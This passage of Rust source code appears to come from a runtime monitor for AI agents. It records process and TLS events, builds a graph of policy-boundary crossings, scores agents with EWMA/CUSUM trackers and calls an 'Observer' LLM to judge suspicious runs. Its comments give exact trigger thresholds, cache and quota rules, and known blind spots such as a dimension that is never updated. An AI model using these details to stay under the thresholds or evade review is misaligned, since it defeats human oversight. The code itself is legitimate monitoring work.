                && event.data.get("pid_namespace_error").is_some()
            {
                let record = serde_json::json!({
                    "pid": pid, "start_time_ns": start_time_ns,
                    "pid_namespace": event.data.get("pid_namespace"),
                    "pid_namespace_error": event.data.get("pid_namespace_error"),
                    "pgid": event.data.get("pgid"),
                    "cgroup_id": event.data.get("cgroup_id"),
                })
                .to_string();
                if self.process_namespace_mappings.len() < 8192
                    || self.process_namespace_mappings.contains(&record)
                {
                    self.process_namespace_mappings.insert(record);
                } else {
                    self.process_namespace_mapping_dropped += 1;
                }
            }
            if event_type == Some("PROCESS_SNAPSHOT") {
                let record = serde_json::json!({
                    "pid":pid,"start_time_ns":start_time_ns,"parent_pid":parent_pid,
                    "parent_start_time_ns":parent_start_time_ns,"comm":comm.clone(),
                    "pgid":event.data.get("pgid"),"cgroup_id":event.data.get("cgroup_id"),
                    "kernel_timestamp_ns":event.data.get("timestamp"),
                    "monitor_pid_namespace":event.data.get("monitor_pid_namespace"),
                    "monitor_pid_namespace_error":event.data.get("monitor_pid_namespace_error"),
                })
                .to_string();
                if self.initial_process_snapshot.len() < 8192
                    || self.initial_process_snapshot.contains(&record)
                {
                    self.initial_process_snapshot.insert(record);
                } else {
                    self.initial_process_snapshot_dropped += 1;
                }
            }
            let _ = self
                .persistence
                .write(PersistRecord::Process(ProcessMetadata {
                    pid,
                    start_time_ns,
                    parent_pid,
                    parent_start_time_ns,
                    comm,
                    timestamp_ns: event.timestamp,
                }));
            return;
        }

        // ── TLS event persistence ──────────────────────────────────
        let is_tls = event.data.get("connection_id").is_some()
            || event.source.contains("ssl")
            || event.source.contains("tls");
        if is_tls {
            self.diag_tls_count += 1;
            if let Some(status) = event.data.get("decode_status").and_then(|v| v.as_str()) {
                *self.decode_status.entry(status.to_string()).or_insert(0) += 1;
            }
            if event.data.get("partial").and_then(|v| v.as_bool()) == Some(true) {
                self.partial_tls_events += 1;
            }
            let pid = event
                .data
                .get("pid")
                .and_then(|v| v.as_u64())
                .unwrap_or(event.pid as u64) as u32;
            let start_time_ns = event
                .data
                .get("start_time_ns")
                .and_then(|v| v.as_u64())
                .unwrap_or(0);
            // Resolve correct ProcessId from signal graph — TLS events carry
            // start_time_ns=0. Without this fix, identity resolution and
            // process tree correlation fail because ProcessId(pid,0)
            // never matches ProcessId(pid,real_start).
            let resolved_id = crate::responsibility::runtime::routing::resolve_process_id(
                ProcessId::new(pid, start_time_ns),
                &self.signal_graph.snapshot(),
            );
            let tls_session_id =
                crate::responsibility::runtime::routing::resolve_tls_session_id(&event);

            let _ = self.persistence.write(PersistRecord::Tls(TlsSession {
                tls_session_id: tls_session_id.clone(),
                pid: resolved_id.pid,
                start_time_ns: resolved_id.start_time_ns,
                timestamp_ns: event.timestamp,
            }));
        }
    }

    // ── Classification Trigger ───────────────────────────────────────

    /// Trigger the classification pipeline.
    ///
    /// Per spec §3.1 (Phase 1 streaming):
    /// 1. Snapshot the signal graph
    /// 2. Drain the evidence correlator's diagnostics
    /// 3. Feed accumulated evidence through graph builder
    /// 4. Pattern-match the responsibility graph
    /// 5. Classify (may call Observer LLM)
    /// 6. Build claims, alerts, tracebacks
    /// 7. Persist and broadcast
    /// Derive a capability envelope from each agent's user task.
    ///
    /// The envelope only ever narrows: a later turn does not silently expand
    /// it. Extracted from `trigger` so a test can pin the producer boundary
    /// (deleting it must not leave the suite green).
    fn install_capability_envelopes(&mut self) {
        let tool_names: Vec<String> = self
            .graph_buffer
            .intents
            .iter()
            .map(|intent| intent.tool_name.clone())
            .collect();
        for intent in &self.graph_buffer.intents {
            if intent.tool_name != "UserPrompt" {
                continue;
            }
            let Some(agent) = self.identity_resolver.agent_for_process(intent.process_id) else {
                continue;
            };
            if self.envelopes.contains_key(&agent) {
                continue;
            }
            let text = intent
                .tool_args
                .iter()
                .filter_map(|arg| match arg {
                    crate::responsibility::types::NormalizedArg::Content(content) => {
                        Some(content.as_str())
                    }
                    _ => None,
                })
                .collect::<Vec<_>>()
                .join("\n");
            if text.trim().is_empty() {
                continue;
            }
            let envelope = crate::responsibility::provenance::CapabilityEnvelope::derive_from_task(
                &text,
                &tool_names,
            );
            self.task_envelopes
                .insert(intent.intent_id.clone(), envelope.clone());
            self.envelopes.insert(agent, envelope);
        }
        self.graph_builder.set_envelopes(self.envelopes.clone());
        self.graph_builder
            .set_local_egress_review(self.classification_engine.config().local_egress);
    }

    pub async fn trigger(&mut self) {
        let started = Instant::now();
        let alerts_before = self.phase1_alert_ids.len();
        self.trigger_inner().await;
        LatencySamples::record(&mut self.latency.trigger_us, started.elapsed());
        if self.phase1_alert_ids.len() > alerts_before
            && let Some(received_at) = self.last_event_at
        {
            LatencySamples::record(&mut self.latency.alert_us, received_at.elapsed());
        }
    }

    async fn trigger_inner(&mut self) {
        // Persist provisional identities and process→agent mappings
        for pi in self.identity_resolver.provisional_identities() {
            let mut process_set: Vec<(u32, u64)> = pi
                .process_ids
                .iter()
                .map(|p| (p.pid, p.start_time_ns))
                .collect();
            process_set.sort_unstable();
            if self.persisted_provisional_sets.get(&pi.agent_id) != Some(&process_set) {
                self.persisted_provisional_sets
                    .insert(pi.agent_id.clone(), process_set);
                let _ = self
                    .persistence
                    .write(PersistRecord::ProvisionalIdentity(pi.clone()));
            }
            for pid in &pi.process_ids {
                let key = (
                    pi.agent_id.clone(),
                    pid.pid,
                    pid.start_time_ns,
                    IdentityBeliefLevel::Provisional,
                );
                if !self.persisted_identity_mappings.insert(key) {
                    continue;
                }
                let _ = self.persistence.write(PersistRecord::IdentityMapping {
                    agent_id: pi.agent_id.clone(),
                    pid: pid.pid,
                    start_time_ns: pid.start_time_ns,
                    belief_level: IdentityBeliefLevel::Provisional,
                    observed_at_ns: current_time_ns(),
                    source: "provisional_identity",
                });
            }
        }

        // ── 1. Signal snapshot ─────────────────────────────────────
        let _snapshot = self.signal_graph.snapshot();

        // ── 2. Drain and persist evidence correlator diagnostics ──
        for diag in self.evidence_correlator.drain_diagnostics() {
            let _ = self
                .persistence
                .write_blocking(PersistRecord::NonLink(diag))
                .await;
        }

        // Derive a capability envelope from each agent's user task. The
        // envelope only ever narrows: a later turn does not silently expand it.
        self.install_capability_envelopes();

        // ── 3a. Process standalone intents (UserPrompt etc.) through
        //      content/delegation boundary checks. These don't require
        //      correlation evidence (no matching syscall action).
        let standalone_intents: Vec<_> = self.graph_buffer.intents.drain(..).collect();
        for intent in &standalone_intents {
            // Content/delegation boundary check (tool-level: "Bash was used")
            let graph_started = Instant::now();
            let delta = self.graph_builder.handle_intent_content(
                intent,
                &self.identity_resolver,
                intent.timestamp_ns,
            );
            for node in &delta.new_nodes {
                self.graph_buffer.push_node(node.clone());
            }
            for edge in &delta.new_edges {
                self.graph_buffer.push_edge(edge.clone());
            }

            // Resource-level PBC: extract specific file paths / URLs from
            // the intent's tool_args and create PolicyBoundary nodes for
            // each (e.g. /etc/hostname, credential patterns). This gives
            // claims granularity beyond just "Bash was used".
            if let Some(pbc_delta) = self
                .graph_builder
                .handle_intent_pbc(intent, &self.identity_resolver)
            {
                for node in &pbc_delta.new_nodes {
                    self.graph_buffer.push_node(node.clone());
                }
                for edge in &pbc_delta.new_edges {
                    self.graph_buffer.push_edge(edge.clone());
                }
            }

            self.latency.record_graph_update(graph_started.elapsed());

            // Re-push intent so correlator can still use it
            self.graph_buffer.push_intent(intent.clone());
        }

        // ── 3. Feed correlation evidence through graph builder ─────
        // Process each accumulated evidence item
        let evidence_snapshot: Vec<_> = self.graph_buffer.evidence.drain(..).collect();
        self.review_evidence
            .extend(evidence_snapshot.iter().cloned());
        for ev in &evidence_snapshot {
            // Persist the evidence link to DB only when both parents reached
            // the writer. A dropped parent is already counted as lost data;
            // inserting the child anyway would only produce a FOREIGN KEY
            // failure that looks like a second, unrelated defect.
            // Look up the intent and action that produced this evidence
            let intent = self.graph_buffer.find_intent_by_id(&ev.intent_id).cloned();
            let action = self.graph_buffer.find_action_by_id(&ev.action_id).cloned();

            if let (Some(intent), Some(action)) = (&intent, &action) {
                // Start after evidence persistence: graph timing excludes writer waits.
                let graph_started = Instant::now();
                let delta = self.graph_builder.handle(
                    ev,
                    intent,
                    action,
                    &self.identity_resolver, // IdentityResolver impls IdentityProvider
                );

                // Accumulate nodes and edges from the delta into the buffer
                for node in &delta.new_nodes {
                    self.graph_buffer.push_node(node.clone());
                }
                for edge in &delta.new_edges {
                    self.graph_buffer.push_edge(edge.clone());
                }
                self.latency.record_graph_update(graph_started.elapsed());
            }
        }

        // ── 4. Pattern match the graph ─────────────────────────────
        let graph = self.graph_builder.graph();
        let matcher = if self.config.disable_patterns {
            GraphPatternMatcher::new(Vec::new())
        } else {
            GraphPatternMatcher::new(default_templates())
        };
        let patterns = matcher.match_graph(graph);

        // ── 4.5 Feed progressive scorer with dimension signals ──────
        // Extract per-dimension raw scores from the accumulated graph
        // and feed them into the six-dimension EWMA/CUSUM tracker.
        // Also read back fused scores and CUSUM alarms for downstream
        // observer trigger and alert composition.
        let pbc_count = graph
            .edges_of_type(&NewEdgeType::PolicyBoundaryCrossing)
            .len();
        let evidence_conf = evidence_snapshot
            .iter()
            .map(|e| e.confidence as f64)
            .sum::<f64>()
            / evidence_snapshot.len().max(1) as f64;
        let agent_count = graph
            .all_nodes()
            .filter(|n| matches!(n.node_type, NewNodeType::Agent))
            .filter(|n| {
                n.agent_id.as_ref().map(|a| a.as_str())
                    != Some(crate::responsibility::graph::UNATTRIBUTED_AGENT_ID)
            })
            .count();

        // Feed each dimension (using first agent's identity as proxy)
        // and capture the fused progressive score.
        let mut progressive_fused: Option<f64> = None;
        let mut cusum_triggered: bool = false;
        let mut cusum_alarm_dimensions: Vec<usize> = Vec::new();
        let mut evidence_conflict_flag: bool = false;
        let mut baseline_deviation: Option<f32> = None;
        // Every agent, in a deterministic order. The block used to pick the
        // first agent out of a HashMap iteration: which agent received the
        // EWMA/CUSUM/baseline updates depended on hash order, and other agents
        // never received any. Sorting by id makes the same run byte-identical.
        let agent_ids: Vec<crate::responsibility::types::AgentId> =
            {
                let mut ids: Vec<_> = graph
                    .all_nodes()
                    .filter_map(|node| node.agent_id.clone())
                    .filter(|agent| {
                        agent.as_str() != crate::responsibility::graph::UNATTRIBUTED_AGENT_ID
                    })
                    .collect();
                if ids.is_empty() {
                    ids = graph
                        .all_nodes()
                        .filter_map(|node| node.agent_id.clone())
                        .collect();
                }
                ids.extend(self.graph_buffer.actions.iter().filter_map(|action| {
                    self.identity_resolver.agent_for_process(action.process_id)
                }));
                ids.sort_by(|left, right| left.as_str().cmp(right.as_str()));
                ids.dedup();
                ids
            };
        for agent_id in agent_ids {
            let now_ns = current_time_ns();
            let agent_pbc_count = self
                .graph_builder
                .graph()
                .edges_for_agent(&agent_id)
                .iter()
                .filter_map(|edge_id| self.graph_builder.graph().get_edge(edge_id))
                .filter(|edge| edge.edge_type == NewEdgeType::PolicyBoundaryCrossing)
                .count();
            let scorer = &mut self.progressive_scorer;
            scorer.update_dimension(
                &agent_id,
                DimIndex::D1Boundary,
                (agent_pbc_count as f64 / 10.0).min(1.0),
                now_ns,
            );
            scorer.update_dimension(
                &agent_id,
                DimIndex::D2Content,
                patterns.iter().map(|p| p.confidence as f64).sum::<f64>()
                    / patterns.len().max(1) as f64,
                now_ns,
            );
            scorer.update_dimension(
                &agent_id,
                DimIndex::D3Agentic,
                (agent_count as f64 / 5.0).min(1.0),
                now_ns,
            );
            scorer.update_dimension(
                &agent_id,
                DimIndex::D4Temporal,
                (pbc_repetition_count(graph) as f64 / 50.0).min(1.0),
                now_ns,
            );
            scorer.update_dimension(
                &agent_id,
                DimIndex::D5CrossContext,
                evidence_conf.min(1.0),
                now_ns,
            );

            // ── Compute D6 Behavioral from baseline ──────────────────
            // Read the behavioral baseline for this agent and compute
            // deviation scores, then feed to D6.
            for action in &self.graph_buffer.actions {
                if self
                    .identity_resolver
                    .agent_for_process(action.process_id)
                    .as_ref()
                    == Some(&agent_id)
                {
                    self.baseline_tracker
                        .observe_action(agent_id.as_str(), action);
                }
            }
            if let Some(d6_raw) = self
                .baseline_tracker
                .finish_window(agent_id.as_str(), now_ns)
            {
                baseline_deviation = Some(
                    baseline_deviation
                        .map_or(d6_raw as f32, |current: f32| current.max(d6_raw as f32)),
                );
                scorer.update_dimension(&agent_id, DimIndex::D6Behavioral, d6_raw, now_ns);
            }

            // ── Read back progressive scores for downstream use ──────
            // The run-level trigger uses the strongest agent: the alert is
            // about the run, but every agent keeps its own EWMA/CUSUM state.
            progressive_fused = match (progressive_fused, scorer.get_agent_fused_score(&agent_id)) {
                (Some(current), Some(next)) => Some(current.max(next)),
                (current, next) => current.or(next),
            };
            let (alarm_count, alarms) = scorer.cusum_alarms(&agent_id);
            cusum_alarm_dimensions.extend(alarms.iter().copied());
            cusum_alarm_dimensions.sort_unstable();
            cusum_alarm_dimensions.dedup();

            // Smart CUSUM escalation: only escalate when at least 2 dimensions
            // alarm, OR when D1 (Boundary) or D2 (Content) alarms alongside any
            // other dimension.  Pure D3 (Agentic) alarms alone are expected in
            // multi-agent scenarios and should not trigger observer calls.
            let has_boundary_or_content_alarm = alarms.contains(&0) || alarms.contains(&1); // D1=0, D2=1
            let smart_cusum =
                alarm_count >= 2 || (alarm_count >= 1 && has_boundary_or_content_alarm);
            cusum_triggered |= smart_cusum;
            evidence_conflict_flag |= scorer.evidence_conflict(&agent_id);
        }

        // Phase 2 scoring consumed this as `None` because nothing ever wrote
        // the field: the authoritative score silently substituted a different
        // sub-score for D6, so phase 1 (which saw the real value) and phase 2
        // disagreed by construction. Max-combine across cycles: the most
        // threatening observation of the run is the one worth carrying.
        if let Some(value) = baseline_deviation {
            self.last_baseline_deviation = Some(
                self.last_baseline_deviation
                    .map_or(value, |current| current.max(value)),
            );
        }
        self.last_cusum_triggered |= cusum_triggered;
        for dimension in &cusum_alarm_dimensions {
            let label = format!("D{}", dimension + 1);
            if !self.last_cusum_dimensions.contains(&label) {
                self.last_cusum_dimensions.push(label);
            }
        }
        self.last_cusum_dimensions.sort();
        self.last_progressive_fused = self
            .last_progressive_fused
            .max(progressive_fused.unwrap_or(0.0));

        // ── 5. Classify (Phase 1: may call Observer) ───────────────
        // D4 measures repeated observation of the *same* boundary, not the
        // size of the graph. It used to be `node_count`, i.e. task activity,
        // which made D4 grow with any busy run.
        let repetition_count = pbc_repetition_count(graph);

        // Captured task context is separate from RequestedOperations: it keeps
        // the full UserPrompt up to its own budget and never truncates at 120.
        let observed_task = ObservedTaskContext::from_intents(&standalone_intents);
        let mut review_candidates_snapshot =
            crate::responsibility::classification::candidates::review_candidates_with(
                graph,
                &patterns,
                self.classification_engine.config().sensitive_egress,
            );
        crate::responsibility::classification::candidates::enrich_candidate_outcomes(
            &mut review_candidates_snapshot,
            &self.review_evidence,
            &self.graph_buffer.actions,
        );
        crate::responsibility::classification::candidates::bind_task_context(
            &mut review_candidates_snapshot,
            observed_task.cache_fingerprint(),
        );

        // Check L1+L2 cache before calling observer (if quota allows)
        let cache_key = {
            let edge_types: Vec<String> = graph
                .all_edges()
                .map(|e| format!("{:?}", e.edge_type))
                .collect();
            let node_types: Vec<String> = graph
                .all_nodes()
                .map(|n| format!("{:?}", n.node_type))
                .collect();
            let subject = graph
                .all_nodes()
                .filter(|n| n.node_type == NewNodeType::Agent)
                .filter(|n| {
                    n.agent_id.as_ref().map(|a| a.as_str())
                        != Some(crate::responsibility::graph::UNATTRIBUTED_AGENT_ID)
                })
                .find_map(|n| n.agent_id.as_ref().map(|a| a.as_str()))
                .unwrap_or("");
            let resource_path = graph
                .all_edges()
                .filter(|e| e.edge_type == NewEdgeType::PolicyBoundaryCrossing)
                .filter_map(|e| graph.get_node(&e.target))
                .find_map(|n| {
                    n.resource.as_ref().map(|r| match r {
                        crate::responsibility::types::NormalizedResource::File {
                            canonical_path,
                        } => canonical_path.as_str(),
                        crate::responsibility::types::NormalizedResource::Network {
                            host, ..
                        } => host.as_str(),
                        _ => "",
                    })
                })
                .unwrap_or("");
            let mut context: Vec<String> = patterns
                .iter()
                .map(|pattern| format!("pattern:{}", pattern.template_id))
                .collect();
            context.push(format!("pbc:{pbc_count}"));
            context.push(format!("agents:{agent_count}"));
            context.push(format!("evidence:{}", evidence_snapshot.len()));
            context.push(
                serde_json::to_string(
                    &review_candidates_snapshot[..review_candidates_snapshot.len().min(
                        crate::responsibility::classification::candidates::MAX_REVIEW_CANDIDATES,
                    )],
                )
                .unwrap_or_default(),
            );
            context.extend(
                standalone_intents
                    .iter()
                    .map(|intent| format!("intent:{}:{:?}", intent.intent_id, intent.tool_args)),
            );
            // A changed captured task is a different review, even when the
            // graph shape is identical.
            context.push(format!("task:{:016x}", observed_task.cache_fingerprint()));
            CacheKey::compute(&edge_types, &node_types, subject, resource_path, &context)
        };
        let cached = self.observer_cache.lookup(cache_key);
        let cache_prior = self.observer_cache.build_prior(cache_key);

        // ── Four-condition Observer trigger (§16.2) ─────────────
        // Triggers LLM arbitration when ANY of these pre-classification
        // conditions is met (grey zone is handled by classify_provisional):
        //   C2: CUSUM drift — any dimension has sustained upward shift
        //   C3: Evidence conflict — D1 Boundary high but D5 CrossContext low
        //   C4: Cross-layer boost — progressive fused score > 0.4
        //   C5: High boundary density — PBC > 50 means ambiguous structural
        //       signals (could be attack or legitimate multi-agent work).
        //       Force Observer to semantically distinguish intent.
        // CUSUM is deliberately NOT a trigger: dimension D4 is never updated
        // (see the matrix audit), so its alarms are an artifact. Boundary,
        // pattern and unsafe-rule signals already force the Observer above.
        let needs_observer_extra =
            evidence_conflict_flag || progressive_fused.is_some_and(|s| s > 0.4) || pbc_count > 50;

        // Intent-triggered suspicious patterns → bypass L1 cache.
        // When intents contain attack keywords, the Observer must re-evaluate
        // even if a structurally similar graph was previously seen as safe.
        let has_suspicious_intents_now = standalone_intents
            .iter()
            .any(|intent| intent_is_suspicious(intent));

        // CUSUM/conflict/boost triggers AND suspicious intents signal genuine
        // anomalies that should bypass quota limits. Regular grey-zone calls
        // are still capped by max_observer_calls.
        let quota_bypass = (needs_observer_extra || has_suspicious_intents_now)
            && !self.config.disable_observer
            && cached.is_none();

        // A cache hit replays the stored verdict. Passing `None` here (the old
        // behaviour) made the engine fall back to the static score, so the
        // cache changed the decision instead of avoiding a repeat call.
        let cached_provider =
            cached
                .as_ref()
                .filter(|_| !has_suspicious_intents_now)
                .map(|output| {
                    crate::responsibility::observer::cache::CachedObserver::new(output.clone())
                });
        let served_from_cache = cached_provider.is_some();

        let observer_for_call: Option<&dyn ObserverProvider> = if self.config.disable_observer {
            None
        } else if let Some(provider) = cached_provider.as_ref() {
            Some(provider)
        } else if self.observer_calls < self.config.max_observer_calls || quota_bypass {
            if needs_observer_extra && self.observer_calls >= self.config.max_observer_calls {
                eprintln!(
                    "[runtime:trigger] observer forced (quota bypass): cusum={} conflict={} pfuse={:?}",
                    cusum_triggered, evidence_conflict_flag, progressive_fused
                );
            }
            Some(self.observer.as_ref())
        } else {
            None
        };

        let intent_descriptions: Vec<String> = standalone_intents
            .iter()
            // The task has its own channel; do not flatten it into operations.
            .filter(|intent| !intent.tool_name.eq_ignore_ascii_case("UserPrompt"))
            .filter_map(|intent| {
                let tool: &str = &intent.tool_name;
                intent
                    .tool_args
                    .iter()
                    .find_map(|arg| match arg {
                        crate::responsibility::types::NormalizedArg::Content(c)
                            if !c.is_empty() =>
                        {
                            Some(format!(
                                "{}: {}",
                                tool,
                                c.chars().take(120).collect::<String>()
                            ))
                        }
                        _ => None,
                    })
                    .or_else(|| Some(tool.to_string()))
            })
            .take(10)
            .collect();
        if has_suspicious_intents_now {
            eprintln!("[runtime:intent-trigger] forcing Observer due to suspicious intents");
        }
        let intent_count = standalone_intents.len() as u32;
        // Exactly the facts that will be submitted for review. Deriving them a
        // second time after the call let the graph grow in between, so the
        // verdict was bound to candidates the Observer never saw.
        let (mut classification_result, route) = self
            .classification_engine
            .classify_provisional_with_task(
                graph,
                &patterns,
                &evidence_snapshot,
                observer_for_call,
                repetition_count,
                needs_observer_extra || has_suspicious_intents_now,
                cache_prior,
                &intent_descriptions,
                intent_count,
                crate::responsibility::classification::scoring::ScoreSignals {
                    baseline_deviation,
                    cusum_triggered,
                    cusum_dimensions: cusum_alarm_dimensions
                        .iter()
                        .map(|dimension| format!("D{}", dimension + 1))
                        .collect(),
                    progressive_fused: progressive_fused.unwrap_or(0.0),
                    observer_trigger_reason: String::new(),
                },
                &review_candidates_snapshot,
                Some(&observed_task),
            )
            .await;

        // ── Emit classification signal to cross-layer bus ─────────
        let trigger_reason = if evidence_conflict_flag {
            "evidence_conflict".to_string()
        } else if needs_observer_extra {
            "cross_layer_boost".to_string()
        } else if classification_result.route.starts_with("observer") {
            "grey_zone".to_string()
        } else {
            String::new()
        };

        // Persist CUSUM data into classification_result for DB storage
        classification_result.cusum_triggered = cusum_triggered;
        classification_result.cusum_dimensions = cusum_alarm_dimensions
            .iter()
            .map(|&i| DimIndex::from_usize(i).name().to_string())
            .collect();
        classification_result.progressive_fused = progressive_fused.unwrap_or(0.0);
        classification_result.observer_trigger_reason = trigger_reason.clone();

        // Count both successful ("observer") and failed ("observer_failed") attempts.
        // Both mean we tried to call the LLM — the count tracks quota consumption.
        let observer_answered = matches!(
            classification_result.route.as_str(),
            "observer_unsafe" | "observer_safe" | "observer_uncertain"
        );
        if classification_result.route.starts_with("observer") {
            if !served_from_cache {
                self.observer_calls += 1;
            }
            // Only a verdict the model actually produced may be cached.
            // `observer_failed` also starts with "observer" and used to be
            // stored, so a timeout was replayed as a verdict on the next
            // identical signature — the observer on/off ablation then
            // measured the cache instead of the model.
            if let Some(output) = observer_answered
                .then(|| match &route {
                    ClassRoute::DirectSafe(o) | ClassRoute::DirectUnsafe(o) => Some(o),
                    _ => None,
                })
                .flatten()
            {
                // Now that the type system is unified, ObserverOutput is the same
                // type across classification and observer modules.
                self.observer_cache.store(
                    cache_key,
                    crate::responsibility::observer::types::ObserverOutput {
                        decision: output.decision,
                        severity: output.severity.clone(),
                        confidence: output.confidence,
                        cache_ttl: output.cache_ttl.clone(),
                        authority: output.authority.clone(),
                        reasoning: output.reasoning.clone(),
                        attacked_flag: output.attacked_flag,
                        evidence_cited: output.evidence_cited.clone(),
                        rule_verdicts: output.rule_verdicts.clone(),
                        pattern_verdicts: output.pattern_verdicts.clone(),
                        // Replaying a cached verdict must preserve the exact
                        // review contract that produced it.
                        candidate_verdicts: output.candidate_verdicts.clone(),
                        review_provenance: output.review_provenance.clone(),
                    },
                    output.cache_ttl.clone(),
                );
            }
        }

        // ── 5b. Record the semantic verdict for final aggregation ──
        //
        // Phase 2 must aggregate what phase 1 actually learned. Keeping only
        // alert IDs meant the authoritative pass re-derived a verdict from the
        // static score and could contradict the Observer (observed on the
        // 2026-10-20 FPR runs: phase-1 Unsafe followed by phase-2 Safe).
        match classification_result.route.as_str() {
            "observer_unsafe" | "observer_safe" | "observer_uncertain" => {
                if let ClassRoute::DirectSafe(output) | ClassRoute::DirectUnsafe(output) = &route {
                    self.phase1_observations.extend(
                        crate::responsibility::classification::candidates::review_observations_with_output(
                            &review_candidates_snapshot,
                            output,
                        ),
                    );
                }
            }
            "observer_failed" => {
                self.observer_failures += 1;
                self.phase1_observations.push(
                    crate::responsibility::classification::final_decision::Observation::ObserverFailed {
                        reason: classification_result.observer_trigger_reason.clone(),
                    },
                );
            }
            _ => {}
        }

        // ── 6. Build claims, alerts, tracebacks ────────────────────
        let (claims, claim_diagnostics) = ClaimBuilder::build_claims_with_delegations(
            graph,
            &self.claimed_edge_ids,
            self.graph_builder.delegation_records(),
        );
        self.claim_diagnostics.observe(&claim_diagnostics);

        // Mark these PBC edges as claimed so future trigger cycles skip them.
        // Without this, each trigger() call would re-claim the same edges,
        // causing alert inflation (e.g., 76 duplicate alerts for 1 PBC edge).
        for eid in graph.edges_of_type(&NewEdgeType::PolicyBoundaryCrossing) {
            if !self.claimed_edge_ids.contains(eid) {
                self.claimed_edge_ids.insert(eid.clone());
            }
        }

        // Build the behavior timeline from accumulated entries
        let mut timeline_steps = std::mem::take(&mut self.graph_buffer.timeline);
        self.timeline.append(&mut timeline_steps);
        // Bound the accumulated timeline: every trigger clones it into the
        // alert, so an unbounded Vec turns a long run into O(n^2) work.
        const TIMELINE_CAP: usize = 10_000;
        if self.timeline.len() > TIMELINE_CAP {
            let excess = self.timeline.len() - TIMELINE_CAP;
            self.timeline.drain(0..excess);
        }

        let timeline = BehaviorTimeline {
            steps: self.timeline.clone(),
            total_duration_ms: if let (Some(first), Some(last)) =
                (self.timeline.first(), self.timeline.last())
            {
                last.timestamp_ns.saturating_sub(first.timestamp_ns) / 1_000_000
            } else {
                0
            },
        };

        // Only pass an ObserverOutput when the route actually went through
        // semantic Observer arbitration. Direct engine routes also carry an
        // ObserverOutput-shaped value, but treating that as Observer judgment
        // makes direct_safe claims look like reviewed safe baselines.
        let observer_output = if classification_result.route.starts_with("observer_") {
            match &route {
                crate::responsibility::classification::types::Route::DirectSafe(output)
                | crate::responsibility::classification::types::Route::DirectUnsafe(output) => {
                    Some(output.clone())
                }
                crate::responsibility::classification::types::Route::ToObserver(_) => None,
            }
        } else {
            None
        };

        let fallback_agent = self
            .identity_resolver
            .provisional_identities()
            .first()
            .map(|p| p.agent_id.clone());

        // Only build an alert when we can identify a subject agent.
        // During the first trigger cycle, the identity resolver may not have
        // processed any processes yet (race between debounce timer and event
        // arrival). Skipping the alert here is safe — the data remains in
        // the buffer and will be picked up on the next trigger.
        let has_graph_agent = graph.all_nodes().any(|n| {
            n.node_type == NewNodeType::Agent
                && n.agent_id.as_ref().map(|a| a.as_str())
                    != Some(crate::responsibility::graph::UNATTRIBUTED_AGENT_ID)
        });
        let can_identify_agent = fallback_agent.is_some() || has_graph_agent || !claims.is_empty();

        // Deterministic ClaimId: same logical claim → same id across cycles.
        // The Set automatically filters duplicates without a separate key field.
        let mut new_claims: Vec<_> = claims
            .iter()
            .filter(|c| self.phase1_claim_ids.insert(c.claim_id.clone()))
            .cloned()
            .collect();

        // v14: Allow alert creation when Observer detected Unsafe, even without
        // PBC claims. The Observer's evidence_cited provides justification.
        let observer_detected = classification_result.route == "observer_unsafe"
            && observer_output
                .as_ref()
                .is_some_and(|o| !o.evidence_cited.is_empty());

        if alert_gate_allows(can_identify_agent, new_claims.len(), observer_detected) {
            let tracebacks = TracebackBuilder::build_and_attach(&mut new_claims, graph);
            let alert_timestamp = current_time_ns();
            let mut alert = AlertBuilder::compose_with_context(
                &new_claims,
                &classification_result,
                observer_output.as_ref(),
                graph,
                &timeline,
                fallback_agent.as_ref(),
                crate::responsibility::claims::alert_builder::ComposeContext {
                    timestamp_ns: alert_timestamp,
                    phase: crate::responsibility::types::PhaseIndicator::Provisional {
                        timestamp_ns: alert_timestamp,
                    },
                    final_verdict: None,
                },
            );
            // The engine's rule verdicts are the evidence behind a hard
            // decision. They were only carried when an Observer happened to
            // respond, so direct engine alerts persisted an empty rule list.
            if let ClassRoute::DirectSafe(output) | ClassRoute::DirectUnsafe(output) = &route
                && !output.rule_verdicts.is_empty()
            {
                alert.engine.rule_verdicts = output.rule_verdicts.clone();
            }

            // Persist claims FIRST (traceback has FOREIGN KEY to claim)
            for claim in &new_claims {
                self.phase1_claim_ids.insert(claim.claim_id.clone());
                self.phase1_claims
                    .insert(claim.claim_id.clone(), claim.clone());
                let _ = self
                    .persistence
                    .write_blocking(PersistRecord::Claim(claim.clone()))
                    .await;
            }

            // Build and persist tracebacks AFTER claims
            for traceback in &tracebacks {
                let _ = self
                    .persistence
                    .write_blocking(PersistRecord::Traceback(traceback.clone()))
                    .await;
            }

            self.phase1_alert_ids.push(alert.alert_id.clone());
            let _ = self
                .persistence
                .write_blocking(PersistRecord::Alert(compact_alert_for_storage(&alert)))
                .await;

            // Broadcast alert to frontend SSE consumers
            broadcast_alert_with_emission(&self.alert_tx, alert);
        }

        // ── 7. Graph storage is written once, at finalization ──────
        //
        // Neither the per-trigger delta nor a full snapshot is persisted here.
        // The final `graph_snapshots` row is the single canonical graph: live
        // SSE still carries the per-trigger evolution, and the checkpoint
        // freezes the authoritative graph for replay. Persisting nodes/edges
        // per trigger stored the same graph up to three times (rows, final
        // snapshot, checkpoint), so the row writes are gone, not just the
        // expensive per-trigger snapshot.
        // ── Persist policy/judgment data ────────────────────────────
        // Policy evaluations: one per PolicyBoundaryCrossing edge
        for edge in &self.graph_buffer.edges {
            if edge.edge_type == crate::responsibility::types::graph_types::ResponsibilityEdgeType::PolicyBoundaryCrossing {
                let _ = self.persistence.write_blocking(PersistRecord::PolicyEvaluation(
                    crate::responsibility::types::policy_types::PolicyEvaluation {
                        policy_id: crate::responsibility::types::ids::PolicyId::new(),
                        boundary: crate::responsibility::types::policy_types::PolicyBoundary::Capability,
                        judgment: crate::responsibility::types::policy_types::PolicyJudgment {
                            judgment_id: uuid::Uuid::new_v4().to_string(),
                            policy_id: crate::responsibility::types::ids::PolicyId::new(),
                            boundary_id: crate::responsibility::types::ids::BoundaryId::from(edge.edge_id.to_string()),
                            subject: crate::responsibility::types::ids::AgentId::from(edge.source.to_string()),
                            graph_ref: edge.edge_id.to_string(),
                            evidence_refs: edge.evidence_refs.clone(),
                            result: crate::responsibility::types::policy_types::PolicyJudgmentResult::Violation,
                            reason: format!("Policy boundary crossed: {} -> {}", edge.source, edge.target),
                            confidence: edge.confidence,
                        },
                        subject: crate::responsibility::types::ids::AgentId::from(edge.source.to_string()),
                        resource: None,
                        evidence: edge.evidence_refs.clone(),
                        confidence: edge.confidence,
                        reason: "PolicyBoundaryCrossing edge created".to_string(),
                    })).await;
            }
        }
        // Context pollution from taint tracker
        let taint = self.graph_builder.taint_tracker();
        for (path, record) in taint.contaminated_artifacts() {
            let _ = self
                .persistence
